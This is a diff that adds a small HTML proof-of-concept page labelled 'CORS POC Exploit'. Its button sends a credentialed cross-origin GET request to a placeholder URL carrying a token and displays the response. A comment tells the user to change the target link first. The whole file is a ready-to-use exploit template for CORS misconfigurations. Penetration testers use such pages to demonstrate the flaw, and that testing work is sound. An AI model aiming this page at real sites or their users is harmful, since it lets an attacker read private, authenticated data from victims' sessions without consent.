@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <center>
+    <h2>CORS POC Exploit </h2>
+    <h3>GET Method</h3>
+    <div id="cors">
+      <button type="button" onclick="exploit()">Exploit</button>
+    </div>
+
+    <script>
+      function exploit(){
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange =
+        function(){
+            if (this.readyState == 4 && this.status == 200){
+            document.getElementById("cors").innerHTML = alert(this.responseText);
+            }
+        }; 
+        // Change the link first
+        xhttp.open("GET", "http://example.com?token=xxxxx", true); 
+
+        xhttp.withCredentials = true;
+        xhttp.send();
+      }
+    </script>
+  </center>
+</body>
+</html>
